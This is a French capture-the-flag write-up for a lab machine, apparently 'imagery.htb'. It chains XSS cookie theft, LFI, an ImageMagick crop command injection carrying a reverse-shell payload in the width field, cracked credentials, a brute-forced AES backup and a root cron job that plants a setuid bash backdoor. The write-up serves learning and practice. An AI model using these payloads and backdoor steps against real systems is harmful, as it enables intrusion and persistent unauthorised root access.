Petit scan nmap

Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-29 08:28 EDT
Nmap scan report for 10.10.11.88
Host is up (0.024s latency).
Not shown: 65529 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
7777/tcp open  cbt
7778/tcp open  interwise
8000/tcp open  http-alt
9000/tcp open  cslistener
9001/tcp open  tor-orport

J'inspecte le serveur web 8000 pour commencer et je découvre une page pour faire des reports qui seront "vus" par l'admin (img: sc/support.jpg), et effectivement avec un petit test je trouves un xss le plus simple (img: sc/xss.jpg)
Grace au XSS j'extrait le cookie de l'admin qui n'était pas protégé (img: sc/admin_cookie.jpg)
Une fois sur le compte admin un panel "admin" s'ouvre a moi (img: sc/admin_pannel.pmg)
Le bouton pour télécharger les logs me donne directement l'intuition d'une possible LFI, et effectivement elle existe (img: sc/LFI.jpg)
Je trouve tout d'abord le point d'entrée du serveur dans ../app.py rien de bien interressant a première vue mais dans les imports je trouves pleins d'autres fichiers a analyser
from config import *
from utils import _load_data, _save_data
from utils import *
from api_auth import bp_auth
from api_upload import bp_upload
from api_manage import bp_manage
from api_edit import bp_edit
from api_admin import bp_admin
from api_misc import bp_misc

Dans ../config.py je tombes sur pleins de trucs interressant:
Une path avec de la data:
DATA_STORE_PATH = 'db.json'

Un header pour bypass un truc:
BYPASS_LOCKOUT_HEADER = 'X-Bypass-Lockout'
BYPASS_LOCKOUT_VALUE = os.getenv('CRON_BYPASS_TOKEN', 'default-secret-token-for-dev')

une path vers imageMagik et exiftool (je sais qu'un cve très connu existe pour imageMagik):
IMAGEMAGICK_CONVERT_PATH = '/usr/bin/convert'
EXIFTOOL_PATH = '/usr/bin/exiftool'

Dans ../db.json  je trouves le mdp hashé de l'admin:

    "users": [
        {
            "username": "admin@imagery.htb",
            "password": "5d9c1d507a3f76af1e5c97a3ad1eaa31",
        }
    ]

Malheureusement je n'arrives pas a le crack

dans ../api_edit.py:
je trouves beaucoup de commandes executées

    command = f"{IMAGEMAGICK_CONVERT_PATH} {original_filepath} -crop {width}x{height}+{x}+{y} {output_filepath}"
    subprocess.run(command, capture_output=True, text=True, shell=True, check=True)
elif transform_type == 'rotate':
    degrees = str(params.get('degrees'))
    command = [IMAGEMAGICK_CONVERT_PATH, original_filepath, '-rotate', degrees, output_filepath]
    subprocess.run(command, capture_output=True, text=True, check=True)
elif transform_type == 'saturation':
    value = str(params.get('value'))
    command = [IMAGEMAGICK_CONVERT_PATH, original_filepath, '-modulate', f"100,{float(value)*100},100", output_filepath]
    subprocess.run(command, capture_output=True, text=True, check=True)
elif transform_type == 'brightness':
    value = str(params.get('value'))
    command = [IMAGEMAGICK_CONVERT_PATH, original_filepath, '-modulate', f"100,100,{float(value)*100}", output_filepath]
    subprocess.run(command, capture_output=True, text=True, check=True)
elif transform_type == 'contrast':
    value = str(params.get('value'))
    command = [IMAGEMAGICK_CONVERT_PATH, original_filepath, '-modulate', f"{float(value)*100},{float(value)*100},{float(value)*100}", output_filepath]
    subprocess.run(command, capture_output=True, text=True, check=True)

en modifiant une des variables inclues dans la commande je pourrais potentiellement hijack la commande et faire un rce.
il faudra d'abord que je passes a travers cette sécurité:

    if not session.get('is_testuser_account'):
        return jsonify({'success': False, 'message': 'Feature is still in development.'}), 403
    if 'username' not in session:
        return jsonify({'success': False, 'message': 'Unauthorized. Please log in.'}), 401

Il y a donc plusieurs etapes pour avoir le foothold (img: sc/rce_path.jpg)
1. Recuperer un compte/passer le compte en mode is_testuser_account
3.
2. envoyer une requete POST a /apply_visual_transform avec comme body { imageId: ID, transformType: crop, params: {x: '10',y: '10',height: '10',width: '; revshell <ip>; echo '}}


Partie 1: Recuperer un compte/passer le compte en mode is_testuser_account

en regardant dans la base de donnée (../db.json) je tombes sur un compte testuser
{
    "username": "testuser@imagery.htb",
    "password": "2c65c8d7bfbca32a3ed42596192384f6",
    "isAdmin": false,
    "displayId": "e5f6g7h8",
    "login_attempts": 0,
    "isTestuser": true,
    "failed_login_attempts": 0,
    "locked_until": null
}
je tentes cracker le mdp et ça fonctionne (img: sc/password.jpg)
testuser@imagery.htb:iambatman

Partie 2: j'upload une image

Partie 3: avoir le foothold
j'intercepte la requette au moment du crop, j'insère ensuite le revshell dans la width et tout fonctionne comme prévu, j'ai le foothold (img: sc/foothold.jpg)

Une fois dans la machine je tombes sur un process dans le crontab qui lance /home/web/web/bot/admin.py:
je trouves ça
USERNAME = "admin@imagery.htb"
PASSWORD = "strongsandofbeach"

je tombes aussi sur un dossier backup et un fichier suspect

web@Imagery:/var/backup$ ls -la
total 22524
drwxr-xr-x  2 root root     4096 Sep 22 18:56 .
drwxr-xr-x 14 root root     4096 Sep 22 18:56 ..
-rw-rw-r--  1 root root 23054471 Aug  6  2024 web_20250806_120723.zip.aes

je cherches donc d'où il vient
impossible de trouver bien plus que pyAesCrypt
find / -type f -name '*.py' 2>/dev/null | xargs grep -Hn '\.aes' --color=auto
après avoir cherché une source pendant toute une journée je choisis de tenter le bruteforce (j'aurais dût lancer ça en parallèle, mais j'avais trouvé aucun script et j'avais la flemme de le faire, maintenant j'ai plus aucune autre piste donc on va s'y mettre haha)
avec file:
web_20250806_120723.zip.aes: AES encrypted data, version 2, created by "pyAesCrypt 6.1.1"
je réutilise donc pyaescript (script: script/bruteforce.py)
ça fonctionne je déchiffre le fichier (img: sc/decrypted.jpg)
je trouves donc une version de la db (db.json) qui date d'il y a plus d'un an et dedans je trouves le hash du compte de mark, facilement crackable j'ai donc accès au compte mark:supersmash
le user flag se trouves dans le home

En faisant sudo -l, je tombes sur une commande interressante "charcol" que je peux executer en tant que root (img: sc/sudol.jpg)

En lisant la doc je vois que j'ai deux option pour recuperer le flag (img: sc/2way.jpg)
soit je fais un backup de /root que j'extraie après
soit je rajoute un cronjob (ce qui est souvent un moyen de privesc) pour me créer une backdoor root

je choisis la seconde solution car c'est mieux d'avoir un vrai privesc qu'une simple possibilité de lire les textes

j'execute donc dans charcol en tant que root:
auto add --schedule "* * * * *" --command "cp /bin/bash /tmp/neirda; ; chmod +s /tmp/neirda;" --name "not suspicious"

la backdoor est générée, le root flag se situe dans /root/root.txt
FINIS
Je clean bien toutes mes traces après, par respect des autres joueurs HEIN ! je vous vois

Ce challenge était remplis d'étapes, assez simple si on s'organise bien, j'ai pas eu vraiment de difficultés jusqu'au moment de l'archive protégée par AES, j'ai voulu trouver le mdp directement sur l'app pendant une journée (en me disant que le bruteforce était un peu rébarbatif, et j'avais pas trouvé de scripts tout prêt donc flemme), maintenant je sais qu'il faut toujours lancer un bruteforce en parallèle des recherches quand les recherches commencent à s'éterniser, cela m'aurais sauvé quelques heures. Le privesc pour le root était VRAIMENT VRAIMENT simple donc je n'ai pas grand chose a dire. Challenge niveau MOYEN très propre et très satisfaisant